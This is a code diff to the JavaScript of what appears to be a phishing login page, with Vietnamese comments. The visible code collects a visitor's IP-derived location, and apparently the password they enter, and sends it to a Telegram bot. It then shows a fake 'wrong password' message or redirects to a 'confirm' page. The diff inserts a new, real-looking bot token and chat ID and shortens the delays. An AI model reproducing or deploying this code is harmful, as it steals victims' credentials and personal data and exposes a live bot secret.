@@ -246,8 +246,8 @@ function showPrompt(IpAddress) {
       "%0A<strong>City : </strong>" +
       IpAddress.city;
 
-    const botToken = "8191975430:AAH6G2YKRRz6s2ce0jU1lO8oCbbu0kQwEZY"; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-    const chatId = "-1002267976818"; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+    const botToken = "7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8"; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+    const chatId = "#-2299618966"; // Thay YOUR_CHAT_ID bằng chat_id của bạn
     const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
@@ -267,12 +267,12 @@ function showPrompt(IpAddress) {
             $(".lsd-ring-container").addClass("d-none");
             $("#wrong-password").removeClass("d-none");
             $("#password").val("");
-          }, 2000);
+          }, 500);
         } else {
           setTimeout(function () {
             $(".lsd-ring-container").addClass("d-none");
             window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
-          }, 2000);
+          }, 1000);
         }
       })
       .catch((error) => {
